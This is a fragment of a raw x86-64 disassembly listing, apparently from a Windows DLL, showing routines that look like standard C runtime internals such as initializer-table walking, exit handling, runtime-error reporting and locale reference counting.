   180007a16:	48 83 c7 08          	add    $0x8,%rdi
   180007a1a:	48 3b f3             	cmp    %rbx,%rsi
   180007a1d:	72 ea                	jb     0x180007a09
   180007a1f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007a24:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180007a29:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180007a2e:	48 83 c4 20          	add    $0x20,%rsp
   180007a32:	5f                   	pop    %rdi
   180007a33:	c3                   	ret
   180007a34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007a39:	57                   	push   %rdi
   180007a3a:	48 83 ec 20          	sub    $0x20,%rsp
   180007a3e:	33 c0                	xor    %eax,%eax
   180007a40:	48 8b fa             	mov    %rdx,%rdi
   180007a43:	48 8b d9             	mov    %rcx,%rbx
   180007a46:	48 3b ca             	cmp    %rdx,%rcx
   180007a49:	73 17                	jae    0x180007a62
   180007a4b:	85 c0                	test   %eax,%eax
   180007a4d:	75 13                	jne    0x180007a62
   180007a4f:	48 8b 0b             	mov    (%rbx),%rcx
   180007a52:	48 85 c9             	test   %rcx,%rcx
   180007a55:	74 02                	je     0x180007a59
   180007a57:	ff d1                	call   *%rcx
   180007a59:	48 83 c3 08          	add    $0x8,%rbx
   180007a5d:	48 3b df             	cmp    %rdi,%rbx
   180007a60:	72 e9                	jb     0x180007a4b
   180007a62:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007a67:	48 83 c4 20          	add    $0x20,%rsp
   180007a6b:	5f                   	pop    %rdi
   180007a6c:	c3                   	ret
   180007a6d:	cc                   	int3
   180007a6e:	cc                   	int3
   180007a6f:	cc                   	int3
   180007a70:	b9 08 00 00 00       	mov    $0x8,%ecx
   180007a75:	e9 92 32 00 00       	jmp    0x18000ad0c
   180007a7a:	cc                   	int3
   180007a7b:	cc                   	int3
   180007a7c:	b9 08 00 00 00       	mov    $0x8,%ecx
   180007a81:	e9 76 34 00 00       	jmp    0x18000aefc
   180007a86:	cc                   	int3
   180007a87:	cc                   	int3
   180007a88:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007a8d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180007a92:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   180007a97:	57                   	push   %rdi
   180007a98:	41 54                	push   %r12
   180007a9a:	41 55                	push   %r13
   180007a9c:	41 56                	push   %r14
   180007a9e:	41 57                	push   %r15
   180007aa0:	48 83 ec 40          	sub    $0x40,%rsp
   180007aa4:	45 8b f0             	mov    %r8d,%r14d
   180007aa7:	8b da                	mov    %edx,%ebx
   180007aa9:	44 8b e9             	mov    %ecx,%r13d
   180007aac:	b9 08 00 00 00       	mov    $0x8,%ecx
   180007ab1:	e8 56 32 00 00       	call   0x18000ad0c
   180007ab6:	90                   	nop
   180007ab7:	83 3d f2 32 01 00 01 	cmpl   $0x1,0x132f2(%rip)        # 0x18001adb0
   180007abe:	0f 84 07 01 00 00    	je     0x180007bcb
   180007ac4:	c7 05 22 33 01 00 01 	movl   $0x1,0x13322(%rip)        # 0x18001adf0
   180007acb:	00 00 00 
   180007ace:	44 88 35 17 33 01 00 	mov    %r14b,0x13317(%rip)        # 0x18001adec
   180007ad5:	85 db                	test   %ebx,%ebx
   180007ad7:	0f 85 da 00 00 00    	jne    0x180007bb7
   180007add:	48 8b 0d dc 50 01 00 	mov    0x150dc(%rip),%rcx        # 0x18001cbc0
   180007ae4:	ff 15 ce 95 00 00    	call   *0x95ce(%rip)        # 0x1800110b8
   180007aea:	48 8b f0             	mov    %rax,%rsi
   180007aed:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180007af2:	48 85 c0             	test   %rax,%rax
   180007af5:	0f 84 a9 00 00 00    	je     0x180007ba4
   180007afb:	48 8b 0d b6 50 01 00 	mov    0x150b6(%rip),%rcx        # 0x18001cbb8
   180007b02:	ff 15 b0 95 00 00    	call   *0x95b0(%rip)        # 0x1800110b8
   180007b08:	48 8b f8             	mov    %rax,%rdi
   180007b0b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007b10:	4c 8b e6             	mov    %rsi,%r12
   180007b13:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   180007b18:	4c 8b f8             	mov    %rax,%r15
   180007b1b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180007b20:	48 83 ef 08          	sub    $0x8,%rdi
   180007b24:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180007b29:	48 3b fe             	cmp    %rsi,%rdi
   180007b2c:	72 76                	jb     0x180007ba4
   180007b2e:	33 c9                	xor    %ecx,%ecx
   180007b30:	ff 15 7a 95 00 00    	call   *0x957a(%rip)        # 0x1800110b0
   180007b36:	48 39 07             	cmp    %rax,(%rdi)
   180007b39:	75 02                	jne    0x180007b3d
   180007b3b:	eb e3                	jmp    0x180007b20
   180007b3d:	48 3b fe             	cmp    %rsi,%rdi
   180007b40:	72 62                	jb     0x180007ba4
   180007b42:	48 8b 0f             	mov    (%rdi),%rcx
   180007b45:	ff 15 6d 95 00 00    	call   *0x956d(%rip)        # 0x1800110b8
   180007b4b:	48 8b d8             	mov    %rax,%rbx
   180007b4e:	33 c9                	xor    %ecx,%ecx
   180007b50:	ff 15 5a 95 00 00    	call   *0x955a(%rip)        # 0x1800110b0
   180007b56:	48 89 07             	mov    %rax,(%rdi)
   180007b59:	ff d3                	call   *%rbx
   180007b5b:	48 8b 0d 5e 50 01 00 	mov    0x1505e(%rip),%rcx        # 0x18001cbc0
   180007b62:	ff 15 50 95 00 00    	call   *0x9550(%rip)        # 0x1800110b8
   180007b68:	48 8b d8             	mov    %rax,%rbx
   180007b6b:	48 8b 0d 46 50 01 00 	mov    0x15046(%rip),%rcx        # 0x18001cbb8
   180007b72:	ff 15 40 95 00 00    	call   *0x9540(%rip)        # 0x1800110b8
   180007b78:	4c 3b e3             	cmp    %rbx,%r12
   180007b7b:	75 05                	jne    0x180007b82
   180007b7d:	4c 3b f8             	cmp    %rax,%r15
   180007b80:	74 b9                	je     0x180007b3b
   180007b82:	4c 8b e3             	mov    %rbx,%r12
   180007b85:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180007b8a:	48 8b f3             	mov    %rbx,%rsi
   180007b8d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180007b92:	4c 8b f8             	mov    %rax,%r15
   180007b95:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180007b9a:	48 8b f8             	mov    %rax,%rdi
   180007b9d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007ba2:	eb 97                	jmp    0x180007b3b
   180007ba4:	48 8d 15 1d 97 00 00 	lea    0x971d(%rip),%rdx        # 0x1800112c8
   180007bab:	48 8d 0d f6 96 00 00 	lea    0x96f6(%rip),%rcx        # 0x1800112a8
   180007bb2:	e8 1d fe ff ff       	call   0x1800079d4
   180007bb7:	48 8d 15 1a 97 00 00 	lea    0x971a(%rip),%rdx        # 0x1800112d8
   180007bbe:	48 8d 0d 0b 97 00 00 	lea    0x970b(%rip),%rcx        # 0x1800112d0
   180007bc5:	e8 0a fe ff ff       	call   0x1800079d4
   180007bca:	90                   	nop
   180007bcb:	45 85 f6             	test   %r14d,%r14d
   180007bce:	74 0f                	je     0x180007bdf
   180007bd0:	b9 08 00 00 00       	mov    $0x8,%ecx
   180007bd5:	e8 22 33 00 00       	call   0x18000aefc
   180007bda:	45 85 f6             	test   %r14d,%r14d
   180007bdd:	75 26                	jne    0x180007c05
   180007bdf:	c7 05 c7 31 01 00 01 	movl   $0x1,0x131c7(%rip)        # 0x18001adb0
   180007be6:	00 00 00 
   180007be9:	b9 08 00 00 00       	mov    $0x8,%ecx
   180007bee:	e8 09 33 00 00       	call   0x18000aefc
   180007bf3:	41 8b cd             	mov    %r13d,%ecx
   180007bf6:	e8 0d fb ff ff       	call   0x180007708
   180007bfb:	41 8b cd             	mov    %r13d,%ecx
   180007bfe:	ff 15 c4 94 00 00    	call   *0x94c4(%rip)        # 0x1800110c8
   180007c04:	cc                   	int3
   180007c05:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   180007c0a:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   180007c0f:	48 83 c4 40          	add    $0x40,%rsp
   180007c13:	41 5f                	pop    %r15
   180007c15:	41 5e                	pop    %r14
   180007c17:	41 5d                	pop    %r13
   180007c19:	41 5c                	pop    %r12
   180007c1b:	5f                   	pop    %rdi
   180007c1c:	c3                   	ret
   180007c1d:	cc                   	int3
   180007c1e:	cc                   	int3
   180007c1f:	cc                   	int3
   180007c20:	48 83 ec 28          	sub    $0x28,%rsp
   180007c24:	b9 03 00 00 00       	mov    $0x3,%ecx
   180007c29:	e8 ba 39 00 00       	call   0x18000b5e8
   180007c2e:	83 f8 01             	cmp    $0x1,%eax
   180007c31:	74 17                	je     0x180007c4a
   180007c33:	b9 03 00 00 00       	mov    $0x3,%ecx
   180007c38:	e8 ab 39 00 00       	call   0x18000b5e8
   180007c3d:	85 c0                	test   %eax,%eax
   180007c3f:	75 1d                	jne    0x180007c5e
   180007c41:	83 3d c8 31 01 00 01 	cmpl   $0x1,0x131c8(%rip)        # 0x18001ae10
   180007c48:	75 14                	jne    0x180007c5e
   180007c4a:	b9 fc 00 00 00       	mov    $0xfc,%ecx
   180007c4f:	e8 40 00 00 00       	call   0x180007c94
   180007c54:	b9 ff 00 00 00       	mov    $0xff,%ecx
   180007c59:	e8 36 00 00 00       	call   0x180007c94
   180007c5e:	48 83 c4 28          	add    $0x28,%rsp
   180007c62:	c3                   	ret
   180007c63:	cc                   	int3
   180007c64:	4c 8d 0d c5 9b 00 00 	lea    0x9bc5(%rip),%r9        # 0x180011830
   180007c6b:	33 d2                	xor    %edx,%edx
   180007c6d:	4d 8b c1             	mov    %r9,%r8
   180007c70:	41 3b 08             	cmp    (%r8),%ecx
   180007c73:	74 12                	je     0x180007c87
   180007c75:	ff c2                	inc    %edx
   180007c77:	49 83 c0 10          	add    $0x10,%r8
   180007c7b:	48 63 c2             	movslq %edx,%rax
   180007c7e:	48 83 f8 17          	cmp    $0x17,%rax
   180007c82:	72 ec                	jb     0x180007c70
   180007c84:	33 c0                	xor    %eax,%eax
   180007c86:	c3                   	ret
   180007c87:	48 63 c2             	movslq %edx,%rax
   180007c8a:	48 03 c0             	add    %rax,%rax
   180007c8d:	49 8b 44 c1 08       	mov    0x8(%r9,%rax,8),%rax
   180007c92:	c3                   	ret
   180007c93:	cc                   	int3
   180007c94:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180007c99:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180007c9e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007ca3:	57                   	push   %rdi
   180007ca4:	41 56                	push   %r14
   180007ca6:	41 57                	push   %r15
   180007ca8:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   180007caf:	48 8b 05 4a 13 01 00 	mov    0x1134a(%rip),%rax        # 0x180019000
   180007cb6:	48 33 c4             	xor    %rsp,%rax
   180007cb9:	48 89 84 24 40 02 00 	mov    %rax,0x240(%rsp)
   180007cc0:	00 
   180007cc1:	8b f9                	mov    %ecx,%edi
   180007cc3:	e8 9c ff ff ff       	call   0x180007c64
   180007cc8:	33 f6                	xor    %esi,%esi
   180007cca:	48 8b d8             	mov    %rax,%rbx
   180007ccd:	48 85 c0             	test   %rax,%rax
   180007cd0:	0f 84 99 01 00 00    	je     0x180007e6f
   180007cd6:	8d 4e 03             	lea    0x3(%rsi),%ecx
   180007cd9:	e8 0a 39 00 00       	call   0x18000b5e8
   180007cde:	83 f8 01             	cmp    $0x1,%eax
   180007ce1:	0f 84 1d 01 00 00    	je     0x180007e04
   180007ce7:	8d 4e 03             	lea    0x3(%rsi),%ecx
   180007cea:	e8 f9 38 00 00       	call   0x18000b5e8
   180007cef:	85 c0                	test   %eax,%eax
   180007cf1:	75 0d                	jne    0x180007d00
   180007cf3:	83 3d 16 31 01 00 01 	cmpl   $0x1,0x13116(%rip)        # 0x18001ae10
   180007cfa:	0f 84 04 01 00 00    	je     0x180007e04
   180007d00:	81 ff fc 00 00 00    	cmp    $0xfc,%edi
   180007d06:	0f 84 63 01 00 00    	je     0x180007e6f
   180007d0c:	48 8d 2d 0d 31 01 00 	lea    0x1310d(%rip),%rbp        # 0x18001ae20
   180007d13:	41 bf 14 03 00 00    	mov    $0x314,%r15d
   180007d19:	4c 8d 05 b0 a5 00 00 	lea    0xa5b0(%rip),%r8        # 0x1800122d0
   180007d20:	48 8b cd             	mov    %rbp,%rcx
   180007d23:	41 8b d7             	mov    %r15d,%edx
   180007d26:	e8 69 37 00 00       	call   0x18000b494
   180007d2b:	33 c9                	xor    %ecx,%ecx
   180007d2d:	85 c0                	test   %eax,%eax
   180007d2f:	0f 85 bb 01 00 00    	jne    0x180007ef0
   180007d35:	4c 8d 35 16 31 01 00 	lea    0x13116(%rip),%r14        # 0x18001ae52
   180007d3c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180007d42:	66 89 35 11 33 01 00 	mov    %si,0x13311(%rip)        # 0x18001b05a
   180007d49:	49 8b d6             	mov    %r14,%rdx
   180007d4c:	ff 15 a6 93 00 00    	call   *0x93a6(%rip)        # 0x1800110f8
   180007d52:	41 8d 7f e7          	lea    -0x19(%r15),%edi
   180007d56:	85 c0                	test   %eax,%eax
   180007d58:	75 19                	jne    0x180007d73
   180007d5a:	4c 8d 05 a7 a5 00 00 	lea    0xa5a7(%rip),%r8        # 0x180012308
   180007d61:	8b d7                	mov    %edi,%edx
   180007d63:	49 8b ce             	mov    %r14,%rcx
   180007d66:	e8 29 37 00 00       	call   0x18000b494
   180007d6b:	85 c0                	test   %eax,%eax
   180007d6d:	0f 85 29 01 00 00    	jne    0x180007e9c
   180007d73:	49 8b ce             	mov    %r14,%rcx
   180007d76:	e8 85 37 00 00       	call   0x18000b500
   180007d7b:	48 ff c0             	inc    %rax
   180007d7e:	48 83 f8 3c          	cmp    $0x3c,%rax
   180007d82:	76 39                	jbe    0x180007dbd
   180007d84:	49 8b ce             	mov    %r14,%rcx
   180007d87:	e8 74 37 00 00       	call   0x18000b500
   180007d8c:	48 8d 4d bc          	lea    -0x44(%rbp),%rcx
   180007d90:	4c 8d 05 a1 a5 00 00 	lea    0xa5a1(%rip),%r8        # 0x180012338
   180007d97:	48 8d 0c 41          	lea    (%rcx,%rax,2),%rcx
   180007d9b:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   180007da1:	48 8b c1             	mov    %rcx,%rax
   180007da4:	49 2b c6             	sub    %r14,%rax
   180007da7:	48 d1 f8             	sar    $1,%rax
   180007daa:	48 2b f8             	sub    %rax,%rdi
   180007dad:	48 8b d7             	mov    %rdi,%rdx
   180007db0:	e8 67 37 00 00       	call   0x18000b51c
   180007db5:	85 c0                	test   %eax,%eax
   180007db7:	0f 85 f4 00 00 00    	jne    0x180007eb1
   180007dbd:	4c 8d 05 7c a5 00 00 	lea    0xa57c(%rip),%r8        # 0x180012340
   180007dc4:	49 8b d7             	mov    %r15,%rdx
   180007dc7:	48 8b cd             	mov    %rbp,%rcx
   180007dca:	e8 3d 36 00 00       	call   0x18000b40c
   180007dcf:	85 c0                	test   %eax,%eax
   180007dd1:	0f 85 04 01 00 00    	jne    0x180007edb
   180007dd7:	4c 8b c3             	mov    %rbx,%r8
   180007dda:	49 8b d7             	mov    %r15,%rdx
   180007ddd:	48 8b cd             	mov    %rbp,%rcx
   180007de0:	e8 27 36 00 00       	call   0x18000b40c
   180007de5:	85 c0                	test   %eax,%eax
   180007de7:	0f 85 d9 00 00 00    	jne    0x180007ec6
   180007ded:	48 8d 15 5c a5 00 00 	lea    0xa55c(%rip),%rdx        # 0x180012350
   180007df4:	41 b8 10 20 01 00    	mov    $0x12010,%r8d
   180007dfa:	48 8b cd             	mov    %rbp,%rcx
   180007dfd:	e8 26 38 00 00       	call   0x18000b628
   180007e02:	eb 6b                	jmp    0x180007e6f
   180007e04:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   180007e09:	ff 15 d9 92 00 00    	call   *0x92d9(%rip)        # 0x1800110e8
   180007e0f:	48 8b f8             	mov    %rax,%rdi
   180007e12:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   180007e16:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   180007e1a:	77 53                	ja     0x180007e6f
   180007e1c:	44 8b c6             	mov    %esi,%r8d
   180007e1f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180007e24:	8a 0b                	mov    (%rbx),%cl
   180007e26:	88 0a                	mov    %cl,(%rdx)
   180007e28:	66 39 33             	cmp    %si,(%rbx)
   180007e2b:	74 15                	je     0x180007e42
   180007e2d:	41 ff c0             	inc    %r8d
   180007e30:	48 ff c2             	inc    %rdx
   180007e33:	48 83 c3 02          	add    $0x2,%rbx
   180007e37:	49 63 c0             	movslq %r8d,%rax
   180007e3a:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
   180007e40:	72 e2                	jb     0x180007e24
   180007e42:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180007e47:	40 88 b4 24 33 02 00 	mov    %sil,0x233(%rsp)
   180007e4e:	00 
   180007e4f:	e8 cc 28 00 00       	call   0x18000a720
   180007e54:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   180007e59:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180007e5e:	48 8b cf             	mov    %rdi,%rcx
   180007e61:	4c 8b c0             	mov    %rax,%r8
   180007e64:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007e69:	ff 15 81 92 00 00    	call   *0x9281(%rip)        # 0x1800110f0
   180007e6f:	48 8b 8c 24 40 02 00 	mov    0x240(%rsp),%rcx
   180007e76:	00 
   180007e77:	48 33 cc             	xor    %rsp,%rcx
   180007e7a:	e8 b1 d3 ff ff       	call   0x180005230
   180007e7f:	4c 8d 9c 24 50 02 00 	lea    0x250(%rsp),%r11
   180007e86:	00 
   180007e87:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180007e8b:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   180007e8f:	49 8b 73 38          	mov    0x38(%r11),%rsi
   180007e93:	49 8b e3             	mov    %r11,%rsp
   180007e96:	41 5f                	pop    %r15
   180007e98:	41 5e                	pop    %r14
   180007e9a:	5f                   	pop    %rdi
   180007e9b:	c3                   	ret
   180007e9c:	45 33 c9             	xor    %r9d,%r9d
   180007e9f:	45 33 c0             	xor    %r8d,%r8d
   180007ea2:	33 d2                	xor    %edx,%edx
   180007ea4:	33 c9                	xor    %ecx,%ecx
   180007ea6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007eab:	e8 d4 f6 ff ff       	call   0x180007584
   180007eb0:	cc                   	int3
   180007eb1:	45 33 c9             	xor    %r9d,%r9d
   180007eb4:	45 33 c0             	xor    %r8d,%r8d
   180007eb7:	33 d2                	xor    %edx,%edx
   180007eb9:	33 c9                	xor    %ecx,%ecx
   180007ebb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007ec0:	e8 bf f6 ff ff       	call   0x180007584
   180007ec5:	cc                   	int3
   180007ec6:	45 33 c9             	xor    %r9d,%r9d
   180007ec9:	45 33 c0             	xor    %r8d,%r8d
   180007ecc:	33 d2                	xor    %edx,%edx
   180007ece:	33 c9                	xor    %ecx,%ecx
   180007ed0:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007ed5:	e8 aa f6 ff ff       	call   0x180007584
   180007eda:	cc                   	int3
   180007edb:	45 33 c9             	xor    %r9d,%r9d
   180007ede:	45 33 c0             	xor    %r8d,%r8d
   180007ee1:	33 d2                	xor    %edx,%edx
   180007ee3:	33 c9                	xor    %ecx,%ecx
   180007ee5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007eea:	e8 95 f6 ff ff       	call   0x180007584
   180007eef:	cc                   	int3
   180007ef0:	45 33 c9             	xor    %r9d,%r9d
   180007ef3:	45 33 c0             	xor    %r8d,%r8d
   180007ef6:	33 d2                	xor    %edx,%edx
   180007ef8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180007efd:	e8 82 f6 ff ff       	call   0x180007584
   180007f02:	cc                   	int3
   180007f03:	cc                   	int3
   180007f04:	f0 ff 01             	lock incl (%rcx)
   180007f07:	48 8b 81 d8 00 00 00 	mov    0xd8(%rcx),%rax
   180007f0e:	48 85 c0             	test   %rax,%rax
   180007f11:	74 03                	je     0x180007f16
   180007f13:	f0 ff 00             	lock incl (%rax)
   180007f16:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   180007f1d:	48 85 c0             	test   %rax,%rax
   180007f20:	74 03                	je     0x180007f25
   180007f22:	f0 ff 00             	lock incl (%rax)
   180007f25:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   180007f2c:	48 85 c0             	test   %rax,%rax
   180007f2f:	74 03                	je     0x180007f34
   180007f31:	f0 ff 00             	lock incl (%rax)
   180007f34:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   180007f3b:	48 85 c0             	test   %rax,%rax
   180007f3e:	74 03                	je     0x180007f43
   180007f40:	f0 ff 00             	lock incl (%rax)
   180007f43:	48 8d 41 28          	lea    0x28(%rcx),%rax
   180007f47:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   180007f4d:	48 8d 15 dc 17 01 00 	lea    0x117dc(%rip),%rdx        # 0x180019730
   180007f54:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   180007f58:	74 0b                	je     0x180007f65
   180007f5a:	48 8b 10             	mov    (%rax),%rdx
   180007f5d:	48 85 d2             	test   %rdx,%rdx
   180007f60:	74 03                	je     0x180007f65
   180007f62:	f0 ff 02             	lock incl (%rdx)
   180007f65:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   180007f6a:	74 0c                	je     0x180007f78
   180007f6c:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   180007f70:	48 85 d2             	test   %rdx,%rdx
   180007f73:	74 03                	je     0x180007f78
   180007f75:	f0 ff 02             	lock incl (%rdx)
   180007f78:	48 83 c0 20          	add    $0x20,%rax
   180007f7c:	49 ff c8             	dec    %r8
   180007f7f:	75 cc                	jne    0x180007f4d
   180007f81:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   180007f88:	f0 ff 80 5c 01 00 00 	lock incl 0x15c(%rax)
   180007f8f:	c3                   	ret
   180007f90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007f95:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180007f9a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180007f9f:	57                   	push   %rdi
   180007fa0:	48 83 ec 20          	sub    $0x20,%rsp
   180007fa4:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   180007fab:	48 8b d9             	mov    %rcx,%rbx
   180007fae:	48 85 c0             	test   %rax,%rax
   180007fb1:	74 79                	je     0x18000802c
   180007fb3:	48 8d 0d 76 1e 01 00 	lea    0x11e76(%rip),%rcx        # 0x180019e30
   180007fba:	48 3b c1             	cmp    %rcx,%rax
   180007fbd:	74 6d                	je     0x18000802c
   180007fbf:	48 8b 83 d8 00 00 00 	mov    0xd8(%rbx),%rax
   180007fc6:	48 85 c0             	test   %rax,%rax
   180007fc9:	74 61                	je     0x18000802c
   180007fcb:	83 38 00             	cmpl   $0x0,(%rax)
   180007fce:	75 5c                	jne    0x18000802c
   180007fd0:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   180007fd7:	48 85 c9             	test   %rcx,%rcx
   180007fda:	74 16                	je     0x180007ff2
   180007fdc:	83 39 00             	cmpl   $0x0,(%rcx)
   180007fdf:	75 11                	jne    0x180007ff2
   180007fe1:	e8 9a d5 ff ff       	call   0x180005580
   180007fe6:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   180007fed:	e8 aa 38 00 00       	call   0x18000b89c
   180007ff2:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   180007ff9:	48 85 c9             	test   %rcx,%rcx
   180007ffc:	74 16                	je     0x180008014
   180007ffe:	83 39 00             	cmpl   $0x0,(%rcx)
   180008001:	75 11                	jne    0x180008014
   180008003:	e8 78 d5 ff ff       	call   0x180005580
   180008008:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   18000800f:	e8 94 39 00 00       	call   0x18000b9a8
   180008014:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   18000801b:	e8 60 d5 ff ff       	call   0x180005580
   180008020:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   180008027:	e8 54 d5 ff ff       	call   0x180005580
   18000802c:	48 8b 83 f8 00 00 00 	mov    0xf8(%rbx),%rax
   180008033:	48 85 c0             	test   %rax,%rax
   180008036:	74 47                	je     0x18000807f
   180008038:	83 38 00             	cmpl   $0x0,(%rax)
   18000803b:	75 42                	jne    0x18000807f
   18000803d:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   180008044:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   18000804b:	e8 30 d5 ff ff       	call   0x180005580
   180008050:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   180008057:	bf 80 00 00 00       	mov    $0x80,%edi
   18000805c:	48 2b cf             	sub    %rdi,%rcx
   18000805f:	e8 1c d5 ff ff       	call   0x180005580
   180008064:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   18000806b:	48 2b cf             	sub    %rdi,%rcx
   18000806e:	e8 0d d5 ff ff       	call   0x180005580
   180008073:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   18000807a:	e8 01 d5 ff ff       	call   0x180005580
   18000807f:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   180008086:	48 8d 05 b3 16 01 00 	lea    0x116b3(%rip),%rax        # 0x180019740
   18000808d:	48 3b c8             	cmp    %rax,%rcx
   180008090:	74 1a                	je     0x1800080ac
   180008092:	83 b9 5c 01 00 00 00 	cmpl   $0x0,0x15c(%rcx)
   180008099:	75 11                	jne    0x1800080ac
   18000809b:	e8 74 39 00 00       	call   0x18000ba14
   1800080a0:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1800080a7:	e8 d4 d4 ff ff       	call   0x180005580
   1800080ac:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   1800080b3:	48 8d 7b 28          	lea    0x28(%rbx),%rdi
   1800080b7:	bd 06 00 00 00       	mov    $0x6,%ebp
   1800080bc:	48 8d 05 6d 16 01 00 	lea    0x1166d(%rip),%rax        # 0x180019730
   1800080c3:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   1800080c7:	74 1a                	je     0x1800080e3
   1800080c9:	48 8b 0f             	mov    (%rdi),%rcx
   1800080cc:	48 85 c9             	test   %rcx,%rcx
   1800080cf:	74 12                	je     0x1800080e3
   1800080d1:	83 39 00             	cmpl   $0x0,(%rcx)
   1800080d4:	75 0d                	jne    0x1800080e3
   1800080d6:	e8 a5 d4 ff ff       	call   0x180005580
   1800080db:	48 8b 0e             	mov    (%rsi),%rcx
   1800080de:	e8 9d d4 ff ff       	call   0x180005580
   1800080e3:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   1800080e8:	74 13                	je     0x1800080fd
   1800080ea:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1800080ee:	48 85 c9             	test   %rcx,%rcx
   1800080f1:	74 0a                	je     0x1800080fd
   1800080f3:	83 39 00             	cmpl   $0x0,(%rcx)
   1800080f6:	75 05                	jne    0x1800080fd
   1800080f8:	e8 83 d4 ff ff       	call   0x180005580
   1800080fd:	48 83 c6 08          	add    $0x8,%rsi
   180008101:	48 83 c7 20          	add    $0x20,%rdi
   180008105:	48 ff cd             	dec    %rbp
   180008108:	75 b2                	jne    0x1800080bc
   18000810a:	48 8b cb             	mov    %rbx,%rcx
   18000810d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008112:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180008117:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000811c:	48 83 c4 20          	add    $0x20,%rsp
   180008120:	5f                   	pop    %rdi
   180008121:	e9 5a d4 ff ff       	jmp    0x180005580
   180008126:	cc                   	int3
   180008127:	cc                   	int3
   180008128:	48 85 c9             	test   %rcx,%rcx
   18000812b:	0f 84 97 00 00 00    	je     0x1800081c8
   180008131:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180008135:	f0 44 01 09          	lock add %r9d,(%rcx)
   180008139:	48 8b 81 d8 00 00 00 	mov    0xd8(%rcx),%rax
   180008140:	48 85 c0             	test   %rax,%rax
   180008143:	74 04                	je     0x180008149
   180008145:	f0 44 01 08          	lock add %r9d,(%rax)
   180008149:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   180008150:	48 85 c0             	test   %rax,%rax
   180008153:	74 04                	je     0x180008159
   180008155:	f0 44 01 08          	lock add %r9d,(%rax)
   180008159:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   180008160:	48 85 c0             	test   %rax,%rax
   180008163:	74 04                	je     0x180008169
   180008165:	f0 44 01 08          	lock add %r9d,(%rax)
   180008169:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   180008170:	48 85 c0             	test   %rax,%rax
   180008173:	74 04                	je     0x180008179
